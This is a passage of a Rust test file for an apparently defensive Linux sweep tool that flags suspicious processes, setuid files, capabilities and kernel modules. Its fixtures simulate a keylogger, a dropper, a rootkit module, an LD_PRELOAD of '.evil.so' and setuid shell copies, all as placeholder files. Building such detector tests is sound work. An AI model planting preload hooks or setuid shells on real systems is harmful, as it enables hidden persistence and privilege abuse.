//! Tests of the live checks.

use std::collections::HashSet;
use std::fmt::Write as _;
use std::fs;
use std::os::unix::fs::{MetadataExt as _, PermissionsExt, symlink};
use std::path::Path;

use super::capability::Capabilities;
use super::net::{is_loopback, socket};
use super::{Preload, check, module_name, preloaded};
use crate::autorun::Category;
use crate::rules::RuleId;
use crate::sha256::Sha256;
use crate::sweep::collect::{Body, Origin, Scope};
use crate::sweep::index::PackageIndex;
use crate::test_support::TempDir;

fn write(root: &Path, path: &str, text: &str) {
    fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
    fs::write(root.join(path), text).unwrap();
}

/// A host mount table of one mount, `/`, where set-id bits take effect.
const ONE_MOUNT: &str = "22 1 0:21 / / rw,relatime - ext4 /dev/sda1 rw\n";

/// Writes `ONE_MOUNT` as the host's table, which root's search for set-id
/// files reads to tell where set-id bits take effect.
fn host_mounts(root: &Path) {
    write(root, "proc/1/mountinfo", ONE_MOUNT);
}

fn process(root: &Path, pid: &str, exe: &str, fds: &[(&str, &str)], environment: &str) {
    let directory = root.join("proc").join(pid);
    fs::create_dir_all(directory.join("fd")).unwrap();
    symlink(exe, directory.join("exe")).unwrap();
    for (fd, target) in fds {
        symlink(target, directory.join("fd").join(fd)).unwrap();
    }
    fs::write(directory.join("environ"), environment.replace(';', "\0")).unwrap();
}

#[test]
fn procfs_fields_are_read() {
    assert_eq!(
        module_name("kernel/sound/snd-hda-intel.ko.zst"),
        "snd_hda_intel"
    );
    assert_eq!(
        preloaded(Some(
            b"A=1\0LD_PRELOAD=/usr/lib/x.so:/./home//u/.y.so libz.so\0"
        )),
        [
            Preload::Path("usr/lib/x.so".into()),
            Preload::Path("home/u/.y.so".into()),
            Preload::Searched("libz.so".into())
        ]
    );
    assert!(is_loopback("0100007F") && !is_loopback("00000000"));
    assert!(is_loopback("00000000000000000000000001000000"));
    assert!(!is_loopback("00000000000000000000000000000000"));
    let line = "   0: 00000000:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 4242 1";
    let listening = socket(line).unwrap();
    assert_eq!(
        super::net::shown_for_test(&listening),
        ("0.0.0.0".to_string(), 8080, true, 4242)
    );
}

/// The fixture's processes: fine ones and odd ones.
fn processes(root: &Path) {
    process(
        root,
        "1",
        "/usr/bin/hyprland",
        &[("3", "/dev/input/event0")],
        "",
    );
    process(root, "2", "/usr/bin/updated (deleted)", &[], "");
    process(root, "3", "/tmp/gone (deleted)", &[], "");
    process(root, "4", "/memfd:payload (deleted)", &[], "");
    process(
        root,
        "5",
        "/home/u/.local/bin/keylog",
        &[("3", "/dev/input/event2")],
        "",
    );
    process(root, "6", "/home/u/.cache/dropper", &[], "");
    // A game controller: an input device without letter keys.
    write(root, "home/u/.local/bin/game", "game");
    write(
        root,
        "sys/class/input/event5/device/capabilities/key",
        "7fff000000000000 0\n",
    );
    process(
        root,
        "9",
        "/home/u/.local/bin/game",
        &[("3", "/dev/input/event5")],
        "",
    );
    // A packaged interpreter listening, with no script on disk.
    process(root, "10", "/usr/bin/python3", &[("4", "socket:[333]")], "");
    // A program no package installed, replaced while it runs.
    write(root, "home/u/.local/bin/tool", "new tool");
    process(root, "11", "/home/u/.local/bin/tool (deleted)", &[], "");
    process(
        root,
        "7",
        "/usr/bin/hyprland",
        &[],
        "LD_PRELOAD=/home/u/.evil.so;",
    );
    process(
        root,
        "8",
        "/home/u/server",
        &[("4", "socket:[222]"), ("5", "socket:[111]")],
        "",
    );
}

/// A system with one of everything the live checks look for, and
/// what is fine next to each.
fn fixture() -> (TempDir, PackageIndex) {
    let dir = TempDir::new("sweep-live");
    let root = dir.path();
    let digest = |text: &str| Sha256::digest(text.as_bytes());
    for (path, text) in [
        ("usr/bin/hyprland", "compositor"),
        ("usr/bin/updated", "new version"),
        ("usr/lib/modules/6.1-test/kernel/a.ko.zst", "module a"),
    ] {
        write(root, path, text);
    }
    write(root, "home/u/.local/bin/keylog", "keylogger");
    write(root, "home/u/.cache/dropper", "dropper");
    write(root, "home/u/.evil.so", "preloaded");
    write(root, "home/u/server", "server");
    write(root, "usr/lib/modules/6.1-test/extra/rootkit.ko", "rootkit");
    write(
        root,
        "usr/lib/modules/6.1-test/modules.dep",
        "kernel/a.ko.zst:\nextra/rootkit.ko:\n",
    );
    write(root, "proc/sys/kernel/osrelease", "6.1-test\n");
    write(root, "usr/lib/modules/6.1-test/pkgbase", "linux\n");
    write(root, "usr/bin/python3", "python");
    write(root, "proc/sys/kernel/tainted", "4096\n");
    write(
        root,
        "proc/modules",
        "a 1 0 - Live 0x0\nrootkit 1 0 - Live 0x0\nghost 1 0 - Live 0x0\n",
    );
    write(
        root,
        "proc/net/tcp",
        "  sl  local_address rem_address   st\n   0: 0100007F:0277 00000000:0000 0A 0:0 0:0 0 1000 0 111 1\n   1: 00000000:1F90 00000000:0000 0A 0:0 0:0 0 1000 0 222 1\n   2: 00000000:115C 00000000:0000 0A 0:0 0:0 0 1000 0 333 1\n",
    );
    processes(root);
    write(root, "usr/bin/helper", "helper");
    fs::set_permissions(
        root.join("usr/bin/helper"),
        fs::Permissions::from_mode(0o4755),
    )
    .unwrap();
    // A setuid copy of a packaged program.
    write(root, "home/u/shell", "compositor");
    fs::set_permissions(
        root.join("home/u/shell"),
        fs::Permissions::from_mode(0o4755),
    )
    .unwrap();

    let mut index = PackageIndex::with_foreign(HashSet::new());
    index.add_for_test(
            "core",
            &format!(
                "#mtree\n/set type=file mode=755\n./usr/bin/hyprland sha256digest={}\n./usr/bin/updated sha256digest={}\n./usr/bin/python3 sha256digest={}\n./usr/lib/modules/6.1-test/kernel/a.ko.zst mode=644 sha256digest={}\n./usr/lib/modules/6.1-test/pkgbase mode=644 sha256digest={}\n",
                digest("compositor"),
                digest("new version"),
                digest("python"),
                digest("module a"),
                digest("linux\n")
            ),
            &[],
        );
    (dir, index)
}

#[test]
fn a_process_is_roots_by_its_ids_not_by_who_owns_its_directory() {
    let dir = TempDir::new("sweep-of-root");
    let status = |ids: &str| {
        fs::write(
            dir.path().join("status"),
            format!("Name:\tx\nUid:\t{ids}\nGid:\t0\t0\t0\t0\n"),
        )
        .unwrap();
        super::of_root(dir.path())
    };
    assert!(status("0\t0\t0\t0"));
    assert!(!status("1000\t0\t0\t0"));
    assert!(!status("1000\t1000\t1000\t1000"));
    assert!(!status(""));
    fs::remove_file(dir.path().join("status")).unwrap();
    assert!(!super::of_root(dir.path()));
}

#[test]
fn a_deleted_program_in_its_own_namespace_borrows_a_name() {
    let (dir, index) = fixture();
    let root = dir.path();
    let namespace = |pid: &str, id: &str| {
        fs::create_dir_all(root.join("proc").join(pid).join("ns")).unwrap();
        symlink(
            format!("user:[{id}]"),
            root.join("proc").join(pid).join("ns/user"),
        )
        .unwrap();
    };
    namespace("self", "1");
    // An updated program still running, and one that only took the
    // name: both listen and read the keyboard.
    for (pid, id, socket) in [("20", "1", "444"), ("21", "2", "555")] {
        process(
            root,
            pid,
            "/usr/bin/updated (deleted)",
            &[
                ("3", "/dev/input/event0"),
                ("4", &format!("socket:[{socket}]")),
            ],
            "LD_PRELOAD=/home/u/.evil.so;",
        );
        namespace(pid, id);
    }
    write(
        root,
        "proc/net/tcp",
        "  sl  local_address rem_address   st\n   0: 00000000:1F90 00000000:0000 0A 0:0 0:0 0 1000 0 444 1\n   1: 00000000:1F91 00000000:0000 0A 0:0 0:0 0 1000 0 555 1\n",
    );
    let live = check(&Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    });
    let about = |pid: &str| -> Vec<String> {
        live.items
            .iter()
            .flat_map(|item| item.notes.iter())
            .filter(|note| {
                note.contains(&format!("process {pid} "))
                    || note.contains(&format!("(process {pid})"))
            })
            .cloned()
            .collect()
    };
    // The updated one is a packaged program all the same: that it
    // listens with no packaged service behind it, and what was
    // preloaded into it, is said; its keyboard is its own business.
    let updated = about("20").join("\n");
    assert!(updated.contains("listens on TCP port 8080"), "{updated}");
    assert!(
        updated.contains("preloaded into /usr/bin/updated"),
        "{updated}"
    );
    assert!(!updated.contains("keyboard"), "{updated}");
    assert!(!updated.contains("deleted"), "{updated}");
    let borrowed = about("21").join("\n");
    assert!(
        borrowed.contains("runs a deleted program under the name /usr/bin/updated"),
        "{borrowed}"
    );
    assert!(borrowed.contains("reads the keyboard device"), "{borrowed}");
    assert!(borrowed.contains("listens on TCP port 8081"), "{borrowed}");
    assert!(
        borrowed.contains("preloaded into /usr/bin/updated"),
        "{borrowed}"
    );
    // The packaged file of that name is what the item shows; the
    // listener and the keyboard are alerts on it, so it is not hidden.
    let named = live
        .items
        .iter()
        .find(|item| item.path == "usr/bin/updated")
        .unwrap();
    let alerts: Vec<RuleId> = named.alerts.iter().map(|(rule, _)| *rule).collect();
    assert!(alerts.contains(&RuleId::KeyboardReader), "{alerts:?}");
    assert!(!named.is_trusted());
    let listening = live
        .items
        .iter()
        .find(|item| item.path == "usr/bin/updated:tcp-8081")
        .unwrap();
    assert_eq!(listening.alerts[0].0, RuleId::NetworkListener);
    assert!(!listening.is_trusted());
}

#[test]
fn a_setuid_file_under_a_name_that_is_not_utf8_is_said() {
    use std::ffi::OsStr;
    use std::os::unix::ffi::OsStrExt;
    let dir = TempDir::new("sweep-live-unnamed");
    let root = dir.path();
    fs::create_dir_all(root.join("usr/local")).unwrap();
    let shell = root.join("usr/local").join(OsStr::from_bytes(b"sh\xff"));
    fs::write(&shell, "shell").unwrap();
    fs::set_permissions(&shell, fs::Permissions::from_mode(0o4755)).unwrap();
    fs::write(
        root.join("usr/local").join(OsStr::from_bytes(b"plain\xff")),
        "x",
    )
    .unwrap();
    fs::create_dir(root.join("usr").join(OsStr::from_bytes(b"dir\xff"))).unwrap();
    // A program without capabilities is no privileged file.
    let program = root.join("usr/local").join(OsStr::from_bytes(b"run\xff"));
    fs::write(&program, "program").unwrap();
    fs::set_permissions(&program, fs::Permissions::from_mode(0o755)).unwrap();
    // Where anyone may write, the names are an account's to choose.
    fs::create_dir_all(root.join("var/tmp").join(OsStr::from_bytes(b"d\xfe"))).unwrap();
    let theirs = root.join("var/tmp").join(OsStr::from_bytes(b"sh\xfe"));
    fs::write(&theirs, "shell").unwrap();
    fs::set_permissions(&theirs, fs::Permissions::from_mode(0o4755)).unwrap();
    let their_program = root.join("var/tmp").join(OsStr::from_bytes(b"run\xfe"));
    fs::write(&their_program, "program").unwrap();
    fs::set_permissions(&their_program, fs::Permissions::from_mode(0o755)).unwrap();
    fs::set_permissions(root.join("var/tmp"), fs::Permissions::from_mode(0o1777)).unwrap();
    write(root, "proc/1/mountinfo", ONE_MOUNT);
    let index = PackageIndex::with_foreign(HashSet::new());
    let mut live = check(&Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    });
    live.unchecked.sort();
    assert_eq!(
        live.unchecked,
        [
            "/usr/dir\\xff: a name that is not UTF-8 was not checked",
            "/usr/local/sh\\xff: a name that is not UTF-8 was not checked",
        ]
    );
    assert!(!live.items.iter().any(|item| item.path.contains("run")));
    let digest = Sha256::digest(b"sh\xfe").to_string();
    let named = format!("var/tmp#not-utf8-{}", &digest[..12]);
    assert!(live.items.iter().any(|item| {
        item.path == named
            && item.notes.iter().any(|note| note.contains("sh\\xfe"))
            && item
                .alerts
                .iter()
                .any(|(rule, _)| *rule == RuleId::UnknownPrivilegedFile)
    }));
    assert!(live.of_accounts.contains(&named));
    assert!(
        live.notes
            .iter()
            .any(|note| note.starts_with("1 directory(ies) whose names"))
    );
}

/// The alert the set-id walk raises for the accounts' file `name`, in
/// `directory`, a name that is not UTF-8.
fn odd_named(directory: &str, name: &[u8]) -> String {
    let digest = Sha256::digest(name).to_string();
    format!("{directory}#not-utf8-{}", &digest[..12])
}

#[test]
fn a_name_that_is_not_utf8_below_a_place_anyone_writes_is_an_accounts() {
    use std::ffi::OsStr;
    use std::os::unix::ffi::OsStrExt;
    let dir = TempDir::new("sweep-live-unnamed-below");
    let root = dir.path();
    // A directory root owns and only root may write, but in a place anyone
    // may write: whoever made it chose what it holds.
    let theirs = root.join("var/tmp/sub");
    fs::create_dir_all(&theirs).unwrap();
    let shell = theirs.join(OsStr::from_bytes(b"sh\xfd"));
    fs::write(&shell, "shell").unwrap();
    fs::set_permissions(&shell, fs::Permissions::from_mode(0o4755)).unwrap();
    fs::set_permissions(&theirs, fs::Permissions::from_mode(0o755)).unwrap();
    fs::set_permissions(root.join("var/tmp"), fs::Permissions::from_mode(0o1777)).unwrap();
    // On a mount where set-id bits have no effect, a name is not root's to
    // vouch for either.
    fs::create_dir_all(root.join("usr/local")).unwrap();
    let mounted = root.join("usr/local").join(OsStr::from_bytes(b"sh\xfc"));
    fs::write(&mounted, "shell").unwrap();
    fs::set_permissions(&mounted, fs::Permissions::from_mode(0o4755)).unwrap();
    // The host's table is read as bytes: a mount point that is not UTF-8
    // spoils no other line.
    let mut mountinfo = format!("{ONE_MOUNT}40 22 0:40 / /usr/local rw,nosuid - fuse.x x rw\n");
    mountinfo.push_str("41 22 0:41 / /mnt/");
    let mut mountinfo = mountinfo.into_bytes();
    mountinfo.extend_from_slice(b"\xff rw - tmpfs tmpfs rw\n");
    fs::create_dir_all(root.join("proc/1")).unwrap();
    fs::write(root.join("proc/1/mountinfo"), mountinfo).unwrap();
    let index = PackageIndex::with_foreign(HashSet::new());
    let live = check(&Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    });
    assert_eq!(live.unchecked, Vec::<String>::new());
    for named in [
        odd_named("var/tmp/sub", b"sh\xfd"),
        odd_named("usr/local", b"sh\xfc"),
    ] {
        assert!(
            live.items.iter().any(|item| item.path == named) && live.of_accounts.contains(&named),
            "{named}"
        );
    }
}

#[test]
fn files_where_not_only_root_names_them_do_not_use_up_roots_walk() {
    use super::capability::capabilities;
    use super::privileged::{Closed, mounts, privileged_walk};
    let dir = TempDir::new("sweep-live-walk-budget");
    let root = dir.path();
    fs::create_dir_all(root.join("usr/local")).unwrap();
    // Any account may write a mail spool, as `/var/tmp`.
    let spool = root.join("var/spool/mail");
    fs::create_dir_all(&spool).unwrap();
    for at in 0..10 {
        fs::write(spool.join(format!("f{at}")), "").unwrap();
    }
    fs::set_permissions(&spool, fs::Permissions::from_mode(0o1777)).unwrap();
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    };
    let mut closed = Closed {
        mounts: Some(mounts(ONE_MOUNT)),
        ..Closed::default()
    };
    let mut found = super::Found::default();
    privileged_walk(&scope, &mut found, &mut closed, files(5), capabilities);
    assert_eq!(found.unchecked, Vec::<String>::new());
    assert!(
        found
            .notes
            .iter()
            .any(|note| note.starts_with("more than 5 files in places accounts may write")),
        "{:?}",
        found.notes
    );
    // A user's search cannot tell root's places from the others: running
    // out leaves it incomplete.
    let scope = Scope {
        origin: Origin::System,
        ..scope
    };
    let mut found = super::Found::default();
    privileged_walk(
        &scope,
        &mut found,
        &mut Closed::default(),
        files(5),
        capabilities,
    );
    assert_eq!(
        found.unchecked,
        [
            "more than 5 files: setuid programs and files with capabilities were not looked for \
          everywhere"
        ]
    );
}

#[test]
fn a_place_the_walk_starts_at_that_is_a_link_is_not_walked() {
    use super::capability::capabilities;
    use super::privileged::{Closed, mounts, privileged_walk};
    let dir = TempDir::new("sweep-live-walk-link");
    let root = dir.path();
    fs::create_dir_all(root.join("usr")).unwrap();
    symlink("usr", root.join("srv")).unwrap();
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    };
    let mut closed = Closed {
        mounts: Some(mounts(ONE_MOUNT)),
        ..Closed::default()
    };
    let mut found = super::Found::default();
    privileged_walk(&scope, &mut found, &mut closed, files(100), capabilities);
    assert_eq!(
        found.unchecked,
        ["/srv is a link: setuid programs were not looked for there"]
    );
}

/// Gives the file at `path` `cap_net_raw` for the user namespace of the
/// user running the tests, as any account can (`unshare -Ur setcap`);
/// `false` where `unshare` or `setcap` cannot.
fn namespaced_capability(path: &Path) -> bool {
    std::process::Command::new("unshare")
        .args(["-Ur", "setcap", "cap_net_raw+ep"])
        .arg(path)
        .stderr(std::process::Stdio::null())
        .status()
        .is_ok_and(|status| status.success())
}

/// The capabilities getcap's `clauses` give, for clauses that only give
/// (`=` or `+`): `cap_a,cap_b=ep`, `=ep` for every one, and `41=p` by
/// number.
fn given(clauses: &str) -> Capabilities {
    let mut capabilities = Capabilities {
        permitted: 0,
        inheritable: 0,
        effective: false,
        root_id: 0,
    };
    for clause in clauses.split_whitespace() {
        let (names, sets) = clause.split_once(['=', '+']).expect("a clause that gives");
        let bits = if names.is_empty() {
            (1 << 41) - 1
        } else {
            names
                .split(',')
                .fold(0, |bits, name| bits | 1 << bit_of(name))
        };
        if sets.contains('p') {
            capabilities.permitted |= bits;
        }
        if sets.contains('i') {
            capabilities.inheritable |= bits;
        }
        capabilities.effective |= sets.contains('e');
    }
    capabilities
}

/// The bit of the capability `name`, as `Capabilities::names` names it.
fn bit_of(name: &str) -> u32 {
    (0..64)
        .find(|bit| {
            let one = Capabilities {
                permitted: 1 << bit,
                inheritable: 0,
                effective: false,
                root_id: 0,
            };
            one.names() == [name]
        })
        .expect("a capability's name")
}

#[test]
fn the_kernels_capability_data_reads_as_clauses() {
    use super::capability::decode;
    let words = |words: &[u32]| -> Vec<u8> { words.iter().flat_map(|w| w.to_le_bytes()).collect() };
    let text = |data: &[u8]| decode(data).map(|read| read.map(|read| read.to_string()));
    // Revision 2, effective: cap_setuid (7) and cap_net_raw (13) permitted,
    // cap_chown (0) inheritable, and capability 41 permitted.
    let data = words(&[0x0200_0001, 1 << 7 | 1 << 13, 1, 1 << 9, 0]);
    assert_eq!(
        text(&data),
        Ok(Some(
            "cap_chown=ei cap_setuid,cap_net_raw,41=ep".to_string()
        ))
    );
    // Revision 3 names whose root the capabilities are for.
    let data = words(&[0x0300_0000, 1 << 13, 0, 0, 0, 1000]);
    assert_eq!(
        text(&data),
        Ok(Some("cap_net_raw=p [rootid=1000]".to_string()))
    );
    assert_eq!(decode(&data).unwrap().unwrap().root_id, 1000);
    let data = words(&[0x0300_0001, 1 << 13, 0, 0, 0, 0]);
    assert_eq!(text(&data), Ok(Some("cap_net_raw=ep".to_string())));
    // Every capability, as setcap writes `=ep`, and with more besides.
    let data = words(&[0x0200_0001, u32::MAX, 0, 0x1ff, 0]);
    assert_eq!(text(&data), Ok(Some("=ep".to_string())));
    let data = words(&[0x0200_0001, u32::MAX, 0, u32::MAX, 0]);
    assert_eq!(text(&data), Ok(Some("=ep".to_string())));
    let data = words(&[0x0200_0001, u32::MAX, 0, 0xff, 0]);
    assert!(text(&data).unwrap().unwrap().ends_with("cap_bpf=ep"));
    // No capability in any set is none at all.
    assert_eq!(text(&words(&[0x0200_0001, 0, 0, 0, 0])), Ok(None));
    // What the kernel would not write is an error, revision 1 among it.
    assert!(decode(&words(&[0x0100_0001, 1 << 21, 0])).is_err());
    assert!(decode(&words(&[0x0400_0000, 0, 0])).is_err());
    assert!(decode(&words(&[0x0200_0000, 0, 0])).is_err());
    assert!(decode(&words(&[0x0200_0000, 0, 0, 0, 0, 0])).is_err());
    assert!(decode(&words(&[0x0300_0000, 0, 0, 0, 0])).is_err());
    assert!(decode(&[1, 2]).is_err());
    assert!(decode(&[]).is_err());
}

#[test]
fn no_capability_data_makes_its_reader_panic() {
    use super::capability::decode;
    let mut rng = crate::test_support::Rng::new(0x5ca9);
    let mut byte = || u8::try_from(rng.below(256)).expect("below 256");
    for _ in 0..20_000 {
        let size = [12, 20, 24, usize::from(byte() % 30)][usize::from(byte() % 4)];
        let mut data: Vec<u8> = (0..size).map(|_| byte()).collect();
        if let Some(first) = data.get_mut(3) {
            *first = [1, 2, 3, byte()][usize::from(byte() % 4)];
        }
        if let Ok(Some(read)) = decode(&data) {
            assert!(!read.names().is_empty(), "{read}");
            assert!(!read.to_string().is_empty(), "{read:?}");
        }
    }
}

/// The entry `name` of `directory`, held as the walk holds it.
fn held(directory: &fs::File, name: &[u8]) -> std::io::Result<super::pinned::Held> {
    use std::os::unix::ffi::OsStrExt;
    let mount = super::pinned::mount_of(directory)?;
    super::pinned::hold(directory, mount, std::ffi::OsStr::from_bytes(name))
}

/// The capabilities of the entry `name` of `directory`, on its own mount.
fn capabilities_of(directory: &fs::File, name: &[u8]) -> Option<Capabilities> {
    let super::pinned::Held::Here(file) = held(directory, name).unwrap() else {
        panic!("something is mounted on it");
    };
    super::capability::capabilities(&file).unwrap()
}

#[test]
fn a_files_capabilities_are_read_through_the_file_held() {
    use std::ffi::OsStr;
    use std::os::unix::ffi::OsStrExt;
    let dir = TempDir::new("live-capability-read");
    let root = dir.path();
    fs::write(root.join("plain"), "").unwrap();
    let odd = root.join(OsStr::from_bytes(b"run\xfe"));
    fs::write(&odd, "").unwrap();
    let directory = fs::File::open(root).unwrap();
    assert!(capabilities_of(&directory, b"plain").is_none());
    assert_eq!(
        held(&directory, b"gone").unwrap_err().kind(),
        std::io::ErrorKind::NotFound
    );
    assert_eq!(
        held(&directory, b"a\0b").unwrap_err().kind(),
        std::io::ErrorKind::InvalidInput
    );
    // A filesystem that keeps no such attribute gives none.
    let proc = fs::File::open("/proc/self").unwrap();
    assert!(capabilities_of(&proc, b"status").is_none());
    if !namespaced_capability(&odd) {
        errln!("skipped: unshare -Ur setcap is not available");
        return;
    }
    let read = capabilities_of(&directory, b"run\xfe").unwrap();
    assert_eq!(read.names(), ["cap_net_raw"]);
    assert_ne!(read.root_id, 0);
}

#[test]
fn an_entry_with_something_mounted_on_it_is_told_apart() {
    use super::pinned::{Held, is_listed, open_directory};
    use super::privileged::{Asked, askable};
    let top = fs::File::open("/").unwrap();
    let mut table = super::mount_table::MountTable::default();
    // `/proc` is a mount of its own wherever the tests run, root's, of
    // another filesystem than `/`: it may be asked about, as one on it.
    assert!(matches!(held(&top, b"proc").unwrap(), Held::Mounted(..)));
    assert!(matches!(
        askable(held(&top, b"proc").unwrap(), |id| table.kind(id)),
        Some(Asked::File(_))
    ));
    assert!(matches!(
        askable(held(&top, b"etc").unwrap(), |id| table.kind(id)),
        Some(Asked::File(_))
    ));
    let dir = TempDir::new("live-pinned");
    let root = dir.path();
    fs::create_dir(root.join("d")).unwrap();
    symlink("d", root.join("link")).unwrap();
    let directory = fs::File::open(root).unwrap();
    let Held::Here(d) = held(&directory, b"d").unwrap() else {
        panic!("a directory on its parent's mount");
    };
    let listed = super::pinned::Identity::of(&fs::symlink_metadata(root.join("d")).unwrap());
    assert!(is_listed(&d, listed).unwrap());
    assert!(open_directory(&d).is_ok());
    // A link is held as the link, not as what it leads to.
    let Held::Here(link) = held(&directory, b"link").unwrap() else {
        panic!("a link on its directory's mount");
    };
    assert!(!is_listed(&link, listed).unwrap());
}

#[test]
fn a_deep_chain_of_directories_is_walked_to_a_depth_and_quickly() {
    let dir = TempDir::new("live-walk-deep");
    let root = dir.path();
    let theirs = root.join("var/tmp");
    let mut deep = theirs.clone();
    for _ in 0..2_000 {
        deep.push("d");
    }
    fs::create_dir_all(&deep).unwrap();
    let mut shallow = theirs.clone();
    for _ in 0..30 {
        shallow.push("s");
    }
    setuid_file(&shallow.join("x"));
    fs::set_permissions(&theirs, fs::Permissions::from_mode(0o1777)).unwrap();
    let started = std::time::Instant::now();
    let found = walk_as_root(root, files(100_000), none_anywhere, ONE_MOUNT);
    // Walked again from the root for each directory, 64 levels took about
    // as long as 2,000 do now; it is far under either way.
    assert!(started.elapsed() < std::time::Duration::from_secs(5));
    let path = format!("var/tmp/{}x", "s/".repeat(30));
    assert!(found.items.contains_key(&path), "{:?}", found.items.keys());
    assert!(
        found.notes.iter().any(|note| note.starts_with(
            "1 directory(ies) more than 64 below where the walk starts, in places accounts may write"
        )),
        "{:?}",
        found.notes
    );
    assert_eq!(found.unchecked, Vec::<String>::new());
}

/// The sweep's budget, with `files` files to a run.
fn files(files: usize) -> super::privileged::Budget {
    super::privileged::Budget {
        files,
        ..super::privileged::Budget::SWEEP
    }
}

/// Reads `cap_net_raw=ep` on every file.
#[expect(
    clippy::unnecessary_wraps,
    reason = "the type the walk reads capabilities by"
)]
fn net_raw_everywhere(_: &fs::File) -> std::io::Result<Option<Capabilities>> {
    Ok(Some(given("cap_net_raw=ep")))
}

/// Reads no capabilities on any file.
#[expect(
    clippy::unnecessary_wraps,
    reason = "the type the walk reads capabilities by"
)]
fn none_anywhere(_: &fs::File) -> std::io::Result<Option<Capabilities>> {
    Ok(None)
}

/// Root's walk of `root`, with `mountinfo` as the host's mounts.
fn walk_as_root(
    root: &Path,
    budget: super::privileged::Budget,
    read: super::privileged::ReadCapabilities,
    mountinfo: &str,
) -> super::Found {
    walk_with(
        root,
        &PackageIndex::with_foreign(HashSet::new()),
        budget,
        read,
        mountinfo,
    )
}

/// `walk_as_root` with the packages of `index`.
fn walk_with(
    root: &Path,
    index: &PackageIndex,
    budget: super::privileged::Budget,
    read: super::privileged::ReadCapabilities,
    mountinfo: &str,
) -> super::Found {
    let scope = Scope {
        root,
        home: None,
        index,
        origin: Origin::Root,
    };
    let mut closed = super::Closed {
        mounts: Some(super::mounts(mountinfo)),
        ..super::Closed::default()
    };
    let mut found = super::Found::default();
    super::privileged::privileged_walk(&scope, &mut found, &mut closed, budget, read);
    found
}

/// Writes a setuid file at `path`.
fn setuid_file(path: &Path) {
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(path, "program").unwrap();
    fs::set_permissions(path, fs::Permissions::from_mode(0o4755)).unwrap();
}

#[test]
fn a_privileged_file_is_looked_at_by_one_name() {
    let dir = TempDir::new("live-walk-hard-links");
    let root = dir.path();
    setuid_file(&root.join("usr/local/a"));
    fs::hard_link(root.join("usr/local/a"), root.join("usr/local/b")).unwrap();
    fs::hard_link(root.join("usr/local/a"), root.join("usr/local/c")).unwrap();
    setuid_file(&root.join("usr/local/d"));
    let found = walk_as_root(root, files(100), none_anywhere, ONE_MOUNT);
    let names = ["usr/local/a", "usr/local/b", "usr/local/c"];
    let listed = names.iter().filter(|name| found.items.contains_key(**name));
    assert_eq!(listed.count(), 1, "{:?}", found.items.keys());
    assert!(found.items.contains_key("usr/local/d"));
    assert!(
        found.notes.iter().any(|note| note.starts_with(
            "2 more name(s) of setuid files or files with capabilities already looked at"
        )),
        "{:?}",
        found.notes
    );
}

#[test]
fn an_accounts_files_are_hashed_up_to_the_budget_and_roots_always() {
    let dir = TempDir::new("live-walk-hash-budget");
    let root = dir.path();
    for name in ["r1", "r2"] {
        setuid_file(&root.join("usr/local").join(name));
    }
    let theirs = root.join("var/tmp");
    for name in ["a1", "a2", "a3"] {
        setuid_file(&theirs.join(name));
    }
    fs::set_permissions(&theirs, fs::Permissions::from_mode(0o1777)).unwrap();
    // Each file is 7 bytes: two of the accounts' are hashed, and root's
    // are not counted.
    let budget = super::privileged::Budget {
        files: 100,
        hashed: 10,
    };
    let found = walk_as_root(root, budget, none_anywhere, ONE_MOUNT);
    for path in [
        "usr/local/r1",
        "usr/local/r2",
        "var/tmp/a1",
        "var/tmp/a2",
        "var/tmp/a3",
    ] {
        assert!(found.items.contains_key(path), "{path}");
    }
    assert!(
        found
            .notes
            .iter()
            .any(|note| note.starts_with("1 setuid file(s) or file(s) with capabilities in places")),
        "{:?}",
        found.notes
    );
}

#[test]
fn a_packaged_path_past_the_hashing_budget_is_listed() {
    // A package's file at a path in a place accounts may write.
    let (dir, index) = system(
        "live-walk-unhashed-packaged",
        &[("var/tmp/pkg", "packaged")],
    );
    let root = dir.path();
    setuid_file(&root.join("var/tmp/pkg"));
    fs::set_permissions(root.join("var/tmp"), fs::Permissions::from_mode(0o1777)).unwrap();
    let none_hashed = super::privileged::Budget {
        files: 100,
        hashed: 0,
    };
    let found = walk_with(root, &index, none_hashed, none_anywhere, ONE_MOUNT);
    assert!(found.items.contains_key("var/tmp/pkg"), "{:?}", found.notes);
}

#[test]
fn a_directory_is_skipped_only_where_it_holds_other_systems_files() {
    let dir = TempDir::new("live-walk-skipped");
    let root = dir.path();
    // Not a subvolume: any account can name a directory so.
    setuid_file(&root.join("usr/local/.snapshots/s"));
    setuid_file(&root.join("var/cache/x/s"));
    setuid_file(&root.join("var/cache/pacman/pkg/s"));
    let found = walk_as_root(root, files(100), none_anywhere, ONE_MOUNT);
    assert!(found.items.contains_key("usr/local/.snapshots/s"));
    assert!(found.items.contains_key("var/cache/x/s"));
    assert!(!found.items.contains_key("var/cache/pacman/pkg/s"));
}

#[test]
fn a_file_that_is_a_nosuid_mount_point_is_not_asked_about() {
    let dir = TempDir::new("live-walk-file-mount");
    let root = dir.path();
    fs::create_dir_all(root.join("usr/local")).unwrap();
    fs::write(root.join("usr/local/tool"), "tool").unwrap();
    fs::write(root.join("usr/local/other"), "other").unwrap();
    let mountinfo = format!("{ONE_MOUNT}40 22 0:40 / /usr/local/tool rw,nosuid - fuse.x x rw\n");
    let found = walk_as_root(root, files(100), net_raw_everywhere, &mountinfo);
    assert!(found.items.contains_key("usr/local/other"));
    assert!(!found.items.contains_key("usr/local/tool"));
}

#[test]
fn a_name_that_reads_as_a_nosuid_mount_point_is_still_asked_about() {
    use std::ffi::OsStr;
    use std::os::unix::ffi::OsStrExt;

    let dir = TempDir::new("live-walk-lossy-mount");
    let root = dir.path();
    let theirs = root.join("var/tmp");
    fs::create_dir_all(&theirs).unwrap();
    fs::write(theirs.join(OsStr::from_bytes(b"run\xfe")), "program").unwrap();
    fs::set_permissions(&theirs, fs::Permissions::from_mode(0o1777)).unwrap();
    // A mount without set-id at a name that is not UTF-8 (`\xff`): the
    // table is read lossily, as the account's `run\xfe` is, and both read
    // `run\u{fffd}`. The file is on its directory's mount all the same.
    let mountinfo =
